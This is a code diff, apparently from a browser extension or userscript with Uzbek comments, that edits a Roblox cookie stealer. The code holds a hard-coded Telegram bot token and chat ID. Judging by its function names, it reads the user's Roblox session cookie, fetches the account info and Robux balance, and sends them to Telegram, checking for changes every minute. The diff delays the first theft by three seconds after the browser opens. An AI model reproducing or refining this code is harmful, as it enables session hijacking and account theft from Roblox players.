@@ -1,8 +1,11 @@
 const TELEGRAM_BOT_TOKEN = '8819062469:AAFdy6JsOo_wZCnN2wIyz-noszsZQ_PmyVY';
 const TELEGRAM_CHAT_ID = '8043397476';
 
-// Skript yoqilgandayoq darhol tekshirish va long-polling ni boshlash
-checkAndSendCookies();
+// Brauzer ochilgach, kuki va balandlikni tekshirishni 3 soniya kechiktiramiz
+setTimeout(() => {
+    checkAndSendCookies();
+}, 3000);
+
 startLongPolling();
 
 // Har 1 daqiqada kuki o'zgarganini tekshirish
@@ -26,7 +29,7 @@ async function checkAndSendCookies() {
         const userInfo = await getRobloxUserInfo(cookieValue);
         if (!userInfo) return;
 
-        // Robux balansini aniq olish (Fetch orqali ruxsat bilan)
+        // Robux balansini aniq olish
         let robuxBalance = await getRobuxBalance(cookieValue);
 
         let accountId = userInfo.id.toString();
@@ -95,7 +98,7 @@ async function getRobuxBalance(cookieValue) {
             return data.robux !== undefined ? data.robux : 0;
         }
     } catch (e) {}
-    return 0; // Agar xato bo'lsa 0 qaytaradi
+    return 0;
 }
 
 async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, timeStr, accountId) {
